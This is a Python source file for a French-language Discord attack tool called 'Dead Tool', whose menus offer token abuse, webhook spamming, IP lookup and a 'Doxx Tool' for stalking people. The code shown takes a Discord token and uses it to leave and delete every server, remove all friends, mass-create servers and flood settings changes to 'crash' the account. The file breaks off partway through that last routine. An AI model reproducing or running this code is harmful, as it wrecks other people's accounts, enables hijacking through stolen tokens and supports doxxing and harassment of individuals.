"""
███╗   ███╗ ██████╗ ██████╗ ██╗   ██╗██╗     ███████╗███████╗    
████╗ ████║██╔═══██╗██╔══██╗██║   ██║██║     ██╔════╝██╔════╝    
██╔████╔██║██║   ██║██║  ██║██║   ██║██║     █████╗  ███████╗    
██║╚██╔╝██║██║   ██║██║  ██║██║   ██║██║     ██╔══╝  ╚════██║    
██║ ╚═╝ ██║╚██████╔╝██████╔╝╚██████╔╝███████╗███████╗███████║    
╚═╝     ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝    

"""

import os
os.system("title Dead Tool - Installations des modules")
try: import discord
except: os.system("pip install discord")
try: import colorama
except: os.system("pip install colorama")
try: import dhooks
except: os.system("pip install dhooks")
try: import requests
except: os.system("pip install requests")
try: import urllib
except: os.system("pip install urllib")
try: import threading
except: os.system("pip install threding")
try: import terminaltables
except: os.system("pip install terminaltables")
try: import random
except: os.system("pip install random")
try: import concurrent
except: os.system("pip install concurrent")
try: import json
except: os.system("pip install json")
try: import selenium
except: os.system("pip install selenium")
try: import time
except: os.system("pip install time")

os.system("title Dead Tool v1 - Devlopped by Ako")
from colorama import *
from discord import webhook
init()
from time import sleep
from dhooks import Webhook
from selenium import webdriver
import requests as r
import concurrent.futures
from json import dumps
print_lock = threading.Lock()
from itertools import cycle

from urllib.request import Request, urlopen
from modules.searchPersonne import searchPersonne
from modules.searchAdresse import searchAdresse
from modules.searchUserName import searchUserName
from modules.google import google
from modules.facebookStalk import facebookStalk
from modules.searchTwitter import searchTwitter
from modules.searchNumber import searchNumber
from terminaltables import SingleTable
from threading import Thread

"""
███████╗████████╗██╗   ██╗██╗     ███████╗███████╗
██╔════╝╚══██╔══╝╚██╗ ██╔╝██║     ██╔════╝██╔════╝
███████╗   ██║    ╚████╔╝ ██║     █████╗  ███████╗
╚════██║   ██║     ╚██╔╝  ██║     ██╔══╝  ╚════██║
███████║   ██║      ██║   ███████╗███████╗███████║
╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚══════╝╚══════╝

"""
valide = f"[{Fore.GREEN}+{Fore.RESET}] "
invalide = f"[{Fore.RED}-{Fore.RESET}] "
important = "[!] "
wait = f"[{Fore.BLUE}~{Fore.RESET}] "
information = f"[{Fore.RED}!{Fore.RESET}] "


bot = discord.Client()
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
headers = {
		'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
	    'referrer': 'https://google.com',
    	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    	'Accept-Encoding': 'gzip, deflate, br',
    	'Accept-Language': 'en-US,en;q=0.9',
    	'Pragma': 'no-cache'
    }


"""

███╗   ███╗███████╗███╗   ██╗██╗   ██╗███████╗
████╗ ████║██╔════╝████╗  ██║██║   ██║██╔════╝
██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║███████╗
██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║╚════██║
██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝███████║
╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝

"""


print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄    ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓      ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒      ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒        ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
 ░ ░  ░    ░    ░   ▒    ░ ░  ░      ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
   ░       ░  ░     ░  ░   ░                    ░ ░      ░ ░      ░  ░ devlopped by Ako
 ░                       ░                                            
   
╔══════════════════════════════════════════════════════════════════════════════════╗
║    1 - Token Tool                                2 - Webhook Tool                ║
║    3 - IP Adresse Tool                           4 - Doxx Tool                   ║
║                           5 - Tool Info                                          ║
╚══════════════════════════════════════════════════════════════════════════════════╝

    """)
start = input('[>] Que veux-tu faire : ')


def webhookstart():
    os.system("cls")
    print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄     █     █░▓█████  ▄▄▄▄    ██░ ██  ▒█████   ▒█████   ██ ▄█▀
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▓█░ █ ░█░▓█   ▀ ▓█████▄ ▓██░ ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ 
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▒█░ █ ░█ ▒███   ▒██▒ ▄██▒██▀▀██░▒██░  ██▒▒██░  ██▒▓███▄░ 
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ░█░ █ ░█ ▒▓█  ▄ ▒██░█▀  ░▓█ ░██ ▒██   ██░▒██   ██░▓██ █▄ 
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ░░██▒██▓ ░▒████▒░▓█  ▀█▓░▓█▒░██▓░ ████▓▒░░ ████▓▒░▒██▒ █▄
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒    ░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒      ▒ ░ ░   ░ ░  ░▒░▒   ░  ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░
 ░ ░  ░    ░    ░   ▒    ░ ░  ░      ░   ░     ░    ░    ░  ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░ 
   ░       ░  ░     ░  ░   ░           ░       ░  ░ ░       ░  ░  ░    ░ ░      ░ ░  ░  ░   devlopped by Ako
 ░                       ░                               ░                                  
 
╔══════════════════════════════════════════════════════════════════════════════════╗
║    1 - Webhook Delete                          2 - Webhook Spam                  ║
║    3 - Webhook Checker                         4 - Webhook Information           ║
╚══════════════════════════════════════════════════════════════════════════════════╝

""")
    return input('[>] Que veux-tu faire : ')


def ipstart():
    os.system("cls")
    print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄     ██▓ ██▓███  
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▓██▒▓██░  ██▒
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▒██▒▓██░ ██▓▒
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ░██░▒██▄█▓▒ ▒
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ░██░▒██▒ ░  ░
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒    ░▓  ▒▓▒░ ░  ░
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒     ▒ ░░▒ ░     
 ░ ░  ░    ░    ░   ▒    ░ ░  ░     ▒ ░░░ devlopped by Ako      
   ░       ░  ░     ░  ░   ░        ░           
 ░                       ░                      
 
╔══════════════════════════════════════════════════════════════════════════════════╗
║    1 - Ping Ip Adresse                         2 - Geo Ip Adresse                ║
╚══════════════════════════════════════════════════════════════════════════════════╝   
       
          """)
    return input('[>] Que veux-tu faire : ')


def doxxTool():
    os.system("cls")
    print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄    ▓█████▄  ▒█████  ▒██   ██▒▒██   ██▒
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▒██▀ ██▌▒██▒  ██▒▒▒ █ █ ▒░▒▒ █ █ ▒░
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ░██   █▌▒██░  ██▒░░  █   ░░░  █   ░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ░▓█▄   ▌▒██   ██░ ░ █ █ ▒  ░ █ █ ▒ 
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ░▒████▓ ░ ████▓▒░▒██▒ ▒██▒▒██▒ ▒██▒
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒     ▒▒▓  ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░▒▒ ░ ░▓ ░
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒     ░ ▒  ▒   ░ ▒ ▒░ ░░   ░▒ ░░░   ░▒ ░
 ░ ░  ░    ░    ░   ▒    ░ ░  ░     ░ ░  ░ ░ ░ ░ ▒   ░    ░   ░    ░  
   ░       ░  ░     ░  ░   ░          ░        ░ ░   ░    ░   ░    ░  devlopped by Ako
 ░                       ░          ░                                 
           
╔══════════════════════════════════════════════════════════════════════════════════╗
║    1 - Pseudo Lookup                           2 - Name Lookup                   ║
║    3 - ISP Tool                                4 - Resaux Tool                   ║
╚══════════════════════════════════════════════════════════════════════════════════╝
          """)
    return input("[>] Que veux-tu faire : ")


# Information sur les news du tool / support / devloppeur
def deadinfo():
    os.system("cls")
    print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄     ██▓ ███▄    █   █████▒▒█████  
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▓██▒ ██ ▀█   █ ▓██   ▒▒██▒  ██▒
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▒██▒▓██  ▀█ ██▒▒████ ░▒██░  ██▒
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ░██░▓██▒  ▐▌██▒░▓█▒  ░▒██   ██░
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ░██░▒██░   ▓██░░▒█░   ░ ████▓▒░
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒    ░▓  ░ ▒░   ▒ ▒  ▒ ░   ░ ▒░▒░▒░ 
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒     ▒ ░░ ░░   ░ ▒░ ░       ░ ▒ ▒░ 
 ░ ░  ░    ░    ░   ▒    ░ ░  ░     ▒ ░   ░   ░ ░  ░ ░   ░ ░ ░ ▒  
   ░       ░  ░     ░  ░   ░        ░           ░            ░ ░  devlopped by Ako
 ░                       ░                                        

    """)

    print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║    1 - Dead News                               2 - Serveur Support               ║
║                        3 - Devloppeur                                            ║
╚══════════════════════════════════════════════════════════════════════════════════╝          
          
          """)
    return input("[>] Que veux tu faire : ")


# Doxx tool ==> recherche resaux
def reseauxLook():
    os.system("cls")
    print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄     ██▀███  ▓█████   ██████ ▓█████ ▄▄▄       █    ██ ▒██   ██▒
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▓█   ▀▒████▄     ██  ▓██▒▒▒ █ █ ▒░
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▓██ ░▄█ ▒▒███   ░ ▓██▄   ▒███  ▒██  ▀█▄  ▓██  ▒██░░░  █   ░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░ ░ █ █ ▒ 
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ░██▓ ▒██▒░▒████▒▒██████▒▒░▒████▒▓█   ▓██▒▒▒█████▓ ▒██▒ ▒██▒
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒    ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒ ▒▒ ░ ░▓ ░
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒      ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░ ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░ ░░   ░▒ ░
 ░ ░  ░    ░    ░   ▒    ░ ░  ░      ░░   ░    ░   ░  ░  ░     ░    ░   ▒    ░░░ ░ ░  ░    ░  
   ░       ░  ░     ░  ░   ░          ░        ░  ░      ░     ░  ░     ░  ░   ░      ░    ░  devlopped by Ako
 ░                       ░                                                                              
          
          """)
    print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║    1 - Facebook Stalk                             2 - Twitter Stalk              ║
╚══════════════════════════════════════════════════════════════════════════════════╝          
          
          """)
    return input("[>] Que veux-tu faire : ")


def tokenstart():
    os.system("cls")
    print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄    ▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █ 
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █ 
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓      ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒      ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒ 
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒        ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░
 ░ ░  ░    ░    ░   ▒    ░ ░  ░      ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░ 
   ░       ░  ░     ░  ░   ░                    ░ ░  ░  ░      ░  ░         ░ devlopped by Ako
 ░                       ░                                                    

╔══════════════════════════════════════════════════════════════════════════════════╗
║    1 - Friends DmAll                             2 - Token Login                 ║
║    3 - Token Fucker                              4 - Token Raid                  ║
║    5 - Token Info                                6 - Token Checker               ║
╚══════════════════════════════════════════════════════════════════════════════════╝

    """)
    return input('[>] Que veux-tu faire : ')


def TokenRaid():
    os.system("cls")
    print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄     ██▀███   ▄▄▄       ██▓▓█████▄ 
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▓██ ▒ ██▒▒████▄    ▓██▒▒██▀ ██▌
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒░██   █▌
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ▒██▀▀█▄  ░██▄▄▄▄██ ░██░░▓█▄   ▌
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ░██▓ ▒██▒ ▓█   ▓██▒░██░░▒████▓ 
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▓   ▒▒▓  ▒ 
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒      ░▒ ░ ▒░  ▒   ▒▒ ░ ▒ ░ ░ ▒  ▒ 
 ░ ░  ░    ░    ░   ▒    ░ ░  ░      ░░   ░   ░   ▒    ▒ ░ ░ ░  ░ 
   ░       ░  ░     ░  ░   ░          ░           ░  ░ ░     ░ devlopped by Ako   
 ░  
 ░                                 ░                
          """)
    print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║    1 - Token Joiner                             2 - Token Spammeur               ║
╚══════════════════════════════════════════════════════════════════════════════════╝          
          
          """)
    return input('[>] Que veux-tu faire : ')


def fucker():
    os.system("cls")
    print("""
▓█████▄ ▓█████ ▄▄▄      ▓█████▄      █████▒█    ██  ▄████▄   ██ ▄█▀
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▓██   ▒ ██  ▓██▒▒██▀ ▀█   ██▄█▒ 
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▒████ ░▓██  ▒██░▒▓█    ▄ ▓███▄░ 
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ░▓█▒  ░▓▓█  ░██░▒▓▓▄ ▄██▒▓██ █▄ 
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ░▒█░   ▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒     ▒ ░   ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░▒ ▒▒ ▓▒
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒     ░     ░░▒░ ░ ░   ░  ▒   ░ ░▒ ▒░
 ░ ░  ░    ░    ░   ▒    ░ ░  ░     ░ ░    ░░░ ░ ░ ░        ░ ░░ ░ 
   ░       ░  ░     ░  ░   ░                 ░     ░ ░      ░  ░   devlopped by Ako
 ░                       ░                         ░               
     
╔══════════════════════════════════════════════════════════════════════════════════╗
║    1 - NUKE COMPTE                             3 - DELETE FRIENDS                ║
║    2 - DELETE ET LEAVE SERVEURS                4 - SPAM CREATE SERVEURS          ║
║    5 - CRASH TOKEN                             6 - DELETE DM MESSAGES            ║
║                             7 - CLOSE DM                                         ║
╚══════════════════════════════════════════════════════════════════════════════════╝
    """)
    return input('[>] Que veux-tu faire : ')


"""

████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ████████╗ ██████╗  ██████╗ ██╗     
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║       ██║   ██║   ██║██║   ██║██║     
   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║       ██║   ██║   ██║██║   ██║██║     
   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║       ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝

"""


def Nuke():
    os.system("cls")
    print("""
████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  
   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ devlopped by Ako          
          
          """)
    token = input('Indique le token : ')
    head = {'Authorization': str(token)}
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    if src.status_code == 200:
        print(valide + 'Token valide')
        input(important + "Appuie pour continuer...")
        print("Loading...")
        print('\n')
        
        @bot.event
        async def on_ready(times : int=100):
            
            print('STATUS : [ULTIMATE NUKE]')
            print('\n')
            print('1 - JE LEAVE TOUS SES SERVEUR')
            print('\n')

            for guild in bot.guilds:
                try:
                    await guild.leave()
                    print(valide + Fore.WHITE + f"J'AI QUITTER : {guild.name}")
                except:
                    print(invalide + f'IMPOSSIBLE DE QUITTER : {guild.name}')
            print('\n')
            print('2 - JE SUPPRIME SES SERVEURS')
            print('\n')
            for guild in bot.guilds:
                try:
                    await guild.delete()
                    print(valide + Fore.WHITE + f"J'AI SUPPRIMER : {guild.name}")
                except:
                    print(invalide + f'IMPOSSIBLE DE SUPPRIMER : {guild.name}')
            
            print('\n')
            print('3 - SUPPRIMER SES AMIS')
            print('\n')

            for user in bot.user.friends:
                try:
                    await user.remove_friend()
                    print(valide + Fore.WHITE + f"J'AI SUPPRIMER : {user}")
                except:
                    print(invalide + f"IMPOSSIBLE DE SUPPRIMER : {user}")
            
            print('\n')
            print('4 - CREATION DE SERVEUR')
            print('\n')
            crea1 = input("[>] Nom des serveurs : ")
            img = input("[>] Nom du ficher avec l'image : ")
            for i in range(times):
                with open(img, 'rb') as f:
                    icon = f.read()
                await bot.create_guild(crea1, region=None, icon=icon)
                print(valide + Fore.WHITE + f'{i} a bien été crée')
            print('\n')
            print(important + 'LIMITE DE SERVEUR [100]')
            print('\n')
            print('\n')
            print('5 - CRASHING DISCORD')       
            print('\n')

            print('\n')
            print(important + 'JE FAIS CRASH LE TOKEN...')
            headers = {'Authorization': token}
            modes = cycle(["light", "dark"])
            while True:
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
                requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)


        bot.run(token, bot=False)
    else:
        print(invalide + 'Token invalide')
        input(important + "Appuie pour quitter...")
        exit(0)


def friend():
    os.system("cls")
    token = input('[>] Indique le token : ')
    head = {'Authorization': str(token)}
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    if src.status_code == 200:
        print(valide + 'Token valide')
        input(important + "Appuie pour continuer...")
        print("Chargement...")    
        @bot.event
        async def on_ready():
            print(""""
    ███████╗██████╗ ██╗███████╗███╗   ██╗██████╗     ██████╗ ███████╗██╗     ███████╗████████╗███████╗
    ██╔════╝██╔══██╗██║██╔════╝████╗  ██║██╔══██╗    ██╔══██╗██╔════╝██║     ██╔════╝╚══██╔══╝██╔════╝
    █████╗  ██████╔╝██║█████╗  ██╔██╗ ██║██║  ██║    ██║  ██║█████╗  ██║     █████╗     ██║   █████╗  
    ██╔══╝  ██╔══██╗██║██╔══╝  ██║╚██╗██║██║  ██║    ██║  ██║██╔══╝  ██║     ██╔══╝     ██║   ██╔══╝  
    ██║     ██║  ██║██║███████╗██║ ╚████║██████╔╝    ██████╔╝███████╗███████╗███████╗   ██║   ███████╗
    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝     ╚═════╝ ╚══════╝╚══════╝╚══════╝   ╚═╝   ╚══════╝ devlopped by Ako

            """"")
        
            for user in bot.user.friends:
                try:
                    await user.remove_friend()
                    print(valide + Fore.WHITE + f"J'AI SUPPRIMER : {user}")
                except:
                    print(invalide + f"IMPOSSIBLE DE SUPPRIMER : {user}")
            
            print('\n')
            print(important + "Mission Reussi !")
            print('\n')
        bot.run(token, bot=False) 
    else:
        print(invalide + 'Token invalide')
        input(important + "Appuie pour quitter...")
        exit(0) 
def serveurs():
    os.system("cls")
    token = input('[>] Indique le token : ')
    head = {'Authorization': str(token)}
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    if src.status_code == 200:
        print(valide + 'Token valide')
        input(important + "Appuie pour continuer...")    
        print("Chargement...")    
        @bot.event
        async def on_ready():
            print(""""
    ███████╗███████╗██████╗ ██╗   ██╗███████╗██╗   ██╗██████╗ ███████╗    ██╗     ███████╗ █████╗ ██╗   ██╗███████╗██████╗ 
    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██║   ██║██╔══██╗██╔════╝    ██║     ██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██║   ██║██████╔╝███████╗    ██║     █████╗  ███████║██║   ██║█████╗  ██████╔╝
    ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██║   ██║██╔══██╗╚════██║    ██║     ██╔══╝  ██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗╚██████╔╝██║  ██║███████║    ███████╗███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝ devlopped by Ako

            """"")

            for guild in bot.guilds:
                try:
                    await guild.leave()
                    print(valide +  f"J'AI QUITTER : {guild.name}")
                except:
                    print(invalide + f"IMPOSSIBLE DE QUITTER, J'ESSAYE DONC DE SUPPRIMER : {guild.name}")
            for guild in bot.guilds:
                try:
                    await guild.delete()
                    print(valide + Fore.WHITE + f"J'AI SUPPRIMER : {guild.name}")
                except:
                    print(invalide + f'IMPOSSIBLE DE SUPPRIMER : {guild.name}')    

            print('\n')
            print(important + "Mission Reussi !")
            print('\n')

        bot.run(token, bot=False)  
    else:
        print(invalide + 'Token invalide')
        input(important + "Appuie pour quitter...")
        exit(0)  

def spamserv():
    os.system("cls")
    print("""
███████╗███████╗██████╗ ██╗   ██╗███████╗██╗   ██╗██████╗ ███████╗    ███████╗██████╗  █████╗ ███╗   ███╗
██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██║   ██║██╔══██╗██╔════╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
███████╗█████╗  ██████╔╝██║   ██║█████╗  ██║   ██║██████╔╝███████╗    ███████╗██████╔╝███████║██╔████╔██║
╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██║   ██║██╔══██╗╚════██║    ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
███████║███████╗██║  ██║ ╚████╔╝ ███████╗╚██████╔╝██║  ██║███████║    ███████║██║     ██║  ██║██║ ╚═╝ ██║
╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ devlopped by Ako          
          
          """)
    token = input('[>] Indique le token : ')
    img = input("[>] Nom du fichier image : ")
    head = {'Authorization': str(token)}
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    if src.status_code == 200:
        print(valide + 'Token valide')
        input(important + "Appuie pour continuer...")
        print("Chargement...")
        
        @bot.event
        async def on_ready(times: int=95):
            print('STATUS : [SERVER SPAMMER]')
            crea2 = input("Indiquez le nom des serveurs : ")
            
            for i in range(times):
                with open(img, 'rb') as f:
                    icon = f.read()
                    await bot.create_guild(crea2, region=None, icon=icon)
                    print(valide + f'{i} a bien été crée')
        
                    print(information + 'LIMITE SERVEURS [100]')
            print('\n')
            print(valide + "Mission Reussi !")
            print('\n')
            input()
        bot.run(token, bot=False)
    else:
        print(invalide + 'Token invalide')
        input(important + "Appuie pour quitter...")
        exit(0)
def Crash():
    os.system("cls")
    token = input('[>] Indique le token : ')
    head = {'Authorization': str(token)}
    src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
    if src.status_code == 200:
        print(valide + 'Token valide')
        input(important + "Appuie pour continuer...")
        print(""""
    ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ██████╗██████╗  █████╗ ███████╗██╗  ██╗
    ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║
       ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║     ██████╔╝███████║███████╗███████║
       ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║     ██╔══██╗██╔══██║╚════██║██╔══██║
       ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚██████╗██║  ██║██║  ██║███████║██║  ██║
       ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ devlopped by Ako

        """"")
        print('\n')
        print(wait + 'Crash du token en cours...')
        headers = {'Authorization': token}
        modes = cycle(["light", "dark"])
        while True:
            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
